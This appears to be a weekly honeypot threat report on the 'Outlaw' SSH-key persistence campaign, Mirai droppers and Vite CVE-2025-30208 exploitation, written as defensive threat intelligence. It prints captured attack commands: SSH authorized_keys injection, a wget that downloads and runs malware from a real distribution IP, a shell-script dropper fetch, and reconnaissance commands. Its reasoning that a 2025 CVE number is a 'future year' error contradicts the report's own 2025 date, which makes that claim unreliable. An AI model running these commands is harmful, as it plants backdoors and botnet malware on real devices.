# Weekly Honeypot Threat Report: Botnet Campaigns & Exploit Analysis

**Report Generation Time:** 2025-10-19T10:00:00Z
**Timeframe:** October 12, 2025 - October 19, 2025
**Files Used:** This report was generated by analyzing and aggregating data from all `Honeypot_Attack_Summary_Report_*.md` files provided for the specified timeframe.

## 1. Executive Summary

This report provides a comprehensive analysis of botnet activities and other malicious campaigns observed across our global honeypot network over the past week. The threat landscape was characterized by high-volume, automated attacks targeting a mix of legacy and modern vulnerabilities, with the primary goals of botnet propagation, credential harvesting, and establishing persistent backdoors.

Three major, distinct botnet campaigns were identified, each with unique Indicators of Compromise (IOCs):

1.  **"Outlaw Group" Persistence Campaign:** This long-running campaign continues to target servers with weak SSH credentials. Its primary objective is to establish immutable, persistent access for future use, likely for deploying cryptocurrency miners. Its signature "mdrfckr" SSH key remains its most reliable identifier.

2.  **Mirai Variant "urbotnetisass":** This widespread campaign focuses on compromising IoT and embedded devices to expand a Distributed Denial-of-Service (DDoS) botnet. Attackers systematically download multi-architecture payloads of this Mirai variant.

3.  **Mirai "Sora" & "Yukari" Droppers:** A separate Mirai campaign was identified through the use of specific downloader scripts named `sora.sh` and `yukari.sh`. These scripts act as the initial infection vector to pull down the main botnet client on vulnerable IoT devices.

In addition to these botnet activities, a significant and anomalous finding was the attempted exploitation of **CVE-2025-30208**, an arbitrary file read vulnerability in the Vite development tool. The "2025" identifier is highly unusual and appears to be a misattribution in public databases for a recently disclosed 2024 vulnerability, indicating that threat actors are rapidly weaponizing new exploits.

This report will detail the specific tactics, techniques, and procedures (TTPs) for each identified campaign, providing actionable IOCs for manual verification and threat hunting.

## 2. Detailed Botnet Activity Analysis

This section provides a breakdown of each distinct botnet campaign observed during the reporting period.

### 2.1. "Outlaw Group" SSH Persistence Campaign

This campaign continues its highly consistent and automated attacks against SSH servers. The group's primary TTP is to establish a permanent backdoor.

**Objective:**
To gain and maintain persistent, passwordless SSH access to compromised Linux servers.

**Key Indicators & TTPs:**

*   **Initial Access:** Brute-forcing weak or default SSH passwords.
*   **Signature Command:** A one-line command sequence that deletes the existing `.ssh` directory and injects the attacker's public key.
*   **Unique Identifier:** The SSH key contains the unique comment **"mdrfckr"**.

**Captured Data for Verification:**

*   **SSH Public Key:**
    ```
    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrckr
    ```
*   **Associated Commands:**
    ```bash
    # Primary persistence command
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys

    # Commands to make the key immutable (leveraging 'chattr')
    cd ~; chattr -ia .ssh; lockr -ia .ssh
    ```
    *Note: `lockr` appears to be a non-standard command used by the attacker, likely a script or alias related to `chattr`.*

### 2.2. Mirai Botnet Variant ("urbotnetisass")

This is a large-scale campaign focused on infecting a wide array of IoT devices to build a DDoS botnet.

**Objective:**
To compromise IoT devices and add them to a botnet for DDoS attacks.

**Key Indicators & TTPs:**

*   **Staging Directory:** Uses world-writable directories like `/data/local/tmp/` to download payloads.
*   **Malware Name:** Consistently uses the `urbotnetisass` filename.
*   **Multi-Architecture Support:** Downloads binaries for ARM, MIPS, and x86 architectures.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `arm.urbotnetisass`
    *   `arm5.urbotnetisass`
    *   `arm7.urbotnetisass`
    *   `mips.urbotnetisass`
    *   `mipsel.urbotnetisass`
    *   `x86_32.urbotnetisass`
*   **Associated Commands:**
    ```bash
    # Command to download malware targeting an Android/embedded device
    cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisass; ./arm.urbotnetisass
    ```
*   **Known C2/Distribution Server:**
    *   `94.154.35.154`

### 2.3. Mirai Dropper Campaign ("Sora" & "Yukari")

A separate Mirai campaign was identified through its use of specific, named downloader scripts.

**Objective:**
To use lightweight dropper scripts to download and execute the main Mirai botnet client on vulnerable IoT devices.

**Key Indicators & TTPs:**

*   **Initial Infection:** Delivers a small shell script as the initial payload.
*   **Script-Based Download:** The script uses `wget` or `curl` to fetch the main binary.
*   **Distinct Script Names:** Uses filenames `sora.sh` and `yukari.sh`.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `sora.sh`
    *   `yukari.sh`
*   **Associated Commands:**
    ```bash
    # Example command seen in logs
    cd /tmp; wget http://[C2_IP]/sora.sh; sh sora.sh
    ```
    *OSINT confirms both scripts are linked to the Mirai family, though detailed public analysis of "yukari.sh" is less common.*

## 3. Anomalous Exploit Activity: CVE-2025-30208

A significant anomaly was the detection of exploitation attempts for a CVE with a future year identifier.

**Vulnerability:** **CVE-2025-30208** - Arbitrary File Read in **Vite** Development Server.

**Analysis:**
OSINT investigation confirms that this is a **real vulnerability** affecting the popular Vite frontend build tool. The "2025" identifier appears to be an error in public CVE trackers for a vulnerability disclosed in 2024.

**Threat Actor Objective:**
To exploit misconfigured Vite development servers exposed to the internet. A successful attack allows an unauthenticated attacker to read any file on the server's filesystem that the Vite process has access to, including sensitive configuration files, credentials (`.env`), and application source code.

**Key Observation:**
The appearance of this recent vulnerability in automated attack traffic highlights the **rapid weaponization of new exploits** by threat actors. Attackers are integrating PoCs for new vulnerabilities into their scanning toolkits very quickly.

## 4. General Shared TTPs

Across all campaigns, a standard set of post-exploitation behaviors were observed, indicating a common playbook used by automated tools.

*   **System Reconnaissance:**
    ```bash
    uname -a
    whoami
    lscpu | grep Model
    free -m
    df -h
    ```
*   **Malware Competition:** Scripts often included commands to remove competing malware.
    ```bash
    rm -rf /tmp/secure.sh; pkill -9 secure.sh;
    ```
*   **Targeted Default Credentials:** The credential pair `345gs5662d34` / `345gs5662d34` (for Polycom IP phones) was consistently used in brute-force attempts.
